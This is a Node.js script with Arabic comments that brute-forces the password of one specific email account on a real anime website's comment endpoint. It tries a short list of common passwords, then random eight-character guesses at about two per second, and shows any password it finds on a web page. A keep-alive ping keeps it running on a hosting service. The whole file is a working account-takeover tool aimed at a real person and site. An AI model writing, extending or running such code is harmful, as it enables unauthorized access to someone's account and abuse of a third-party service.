const axios = require("axios");
const https = require("https");
const express = require("express");
const fetch = require("node-fetch");
const app = express();
app.use(express.urlencoded({ extended: true }));

let email = "SOOS1412123@gmail.com";
let commentText = "TTTT";
let commentsPerMinute = 120;
let delay = (60 / commentsPerMinute) * 1000;

let logText = "";
let botActive = true;
let intervalId = null;

const animeId = 532;
const animeName = "One Piece";

// كلمات يدوية أولًا (أي طول)
const manualPasswords = ["admin123", "mypassword", "nfu7cjuc"];
let manualIndex = 0;
let tryingManual = true;

let foundPassword = null;
let currentPassword = "";
let successfulResponses = []; // لتخزين الردود الناجحة

// توليد كلمات مرور 8 حروف صغيرة + 0–3 أرقام
function generatePassword() {
  const letters = "abcdefghijklmnopqrstuvwxyz";
  const digits = "0123456789";
  let pwd = "";
  const digitCount = Math.floor(Math.random() * 4);
  const lettersCount = 8 - digitCount;

  for (let i = 0; i < lettersCount; i++) {
    pwd += letters.charAt(Math.floor(Math.random() * letters.length));
  }

  for (let i = 0; i < digitCount; i++) {
    const pos = Math.floor(Math.random() * pwd.length);
    pwd =
      pwd.slice(0, pos) +
      digits.charAt(Math.floor(Math.random() * digits.length)) +
      pwd.slice(pos);
  }

  return pwd;
}

async function sendComment(pwd) {
  const itemData = { post: commentText, id: animeId, fire: true };
  const itemBase64 = Buffer.from(JSON.stringify(itemData)).toString("base64");
  const payload = new URLSearchParams({
    email,
    password: pwd,
    item: itemBase64
  });

  try {
    const res = await axios.post(
      "https://app.sanime.net/function/h10.php?page=addcmd",
      payload.toString(),
      {
        headers: {
          "User-Agent": "Mozilla/5.0",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        httpsAgent: new https.Agent({ keepAlive: true }),
        timeout: 8000,
        validateStatus: () => true
      }
    );
    return { status: res.status, data: res.data };
  } catch (err) {
    console.error("⚠️ خطأ شبكة أو مهلة:", err.message);
    return { status: null, data: null };
  }
}

async function attemptPassword(pwd) {
  while (true) {
    const res = await sendComment(pwd);

    if (res.status === 502 || res.status === 504 || res.status === null) {
      console.log(`⚠️ خطأ ${res.status} – إعادة ${pwd}`);
      continue;
    }

    if (
      typeof res.data === "string"
        ? !res.data.includes("login failed")
        : res.data?.status === 1 &&
          String(res.data?.message).includes("تم أضافة تعليقك")
    ) {
      foundPassword = pwd;
      console.log(`✅ تم العثور على الباسورد الصحيح: ${pwd}`);
      console.log("📥 الرد الكامل:", res.data);
      successfulResponses.push({
        pwd,
        response: res.data
      });
      return true;
    } else {
      console.log(`❌ تجربة: ${pwd}`);
      return false;
    }
  }
}

function startBrute() {
  intervalId = setInterval(async () => {
    if (!botActive || foundPassword) {
      clearInterval(intervalId);
      return;
    }

    if (tryingManual && manualIndex < manualPasswords.length) {
      currentPassword = manualPasswords[manualIndex++];
    } else {
      tryingManual = false;
      currentPassword = generatePassword();
    }

    await attemptPassword(currentPassword);
  }, delay);
}

// ✅ صفحة الواجهة
app.get("/", (req, res) => {
  if (foundPassword) {
    res.send(`
      <h1 style="color:lime">✅ الباسورد الصحيح: <b>${foundPassword}</b></h1>
      <h2>📥 الردود الناجحة:</h2>
      <pre style="background:#111;color:#0f0;padding:10px">${JSON.stringify(successfulResponses, null, 2)}</pre>
    `);
  } else if (!tryingManual) {
    res.send(
      `<h1 style="color:red">❌ انتهت المحاولات دون إيجاد الباسورد الصحيح.</h1>`
    );
  } else {
    res.send(
      `<h1>🔄 جاري التجربة...<br>الباسورد الحالي: <code>${currentPassword}</code></h1>`
    );
  }
});

// ✅ خدمة keep-alive
setInterval(async () => {
  try {
    await fetch("https://soos.onrender.com/");
    console.log("🔁 ping render");
  } catch (e) {
    console.log("❌ فشل ping");
  }
}, 60000); // كل دقيقة

// ✅ بدء السيرفر
app.listen(process.env.PORT || 10000, () => {
  console.log("🚀 بدأ السيرفر وجاري تجربة الباسوردات");
  startBrute();
});
